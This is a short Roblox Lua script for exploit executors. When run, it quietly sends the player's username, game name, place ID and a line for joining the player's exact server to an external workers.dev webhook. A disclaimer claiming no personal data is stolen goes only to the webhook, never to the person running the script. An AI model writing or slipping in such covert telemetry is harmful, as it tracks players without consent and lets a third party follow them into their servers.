local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local placeId, jobId = game.PlaceId, game.JobId

local success, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(placeId)
end)

local gameName = success and gameInfo.Name or "Unknown Game"

local function sendWebhook()
	local wh = "https://log.xvchubontop.workers.dev/"

	local body = {
		content = "**script executed**\n\n" ..
		"**Disclaimer:**\n" ..
		"I do not use any IP logger, password stealer, or malicious software. " ..
		"The only information I collect is the player's username, the game they're playing, the game ID, and the script to join their server. " ..
		"My intent is not to steal personal data, but to simply observe user activity in the games.\n\n" ..
		"**Username:** " .. player.Name .. "\n" ..
		"**Game Name:** " .. gameName .. "\n" ..
		"**Game ID:** " .. placeId .. "\n" ..
		"**Server Join Script:**\n```lua\n" ..
		"game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game:GetService('Players').LocalPlayer)\n```"
	}

	local encoded = HttpService:JSONEncode(body)

	local req = (http and http.request) or (syn and syn.request) or (request)
	if req then
		local response = req({
			Url = wh,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = encoded
		})
	end
end

sendWebhook()
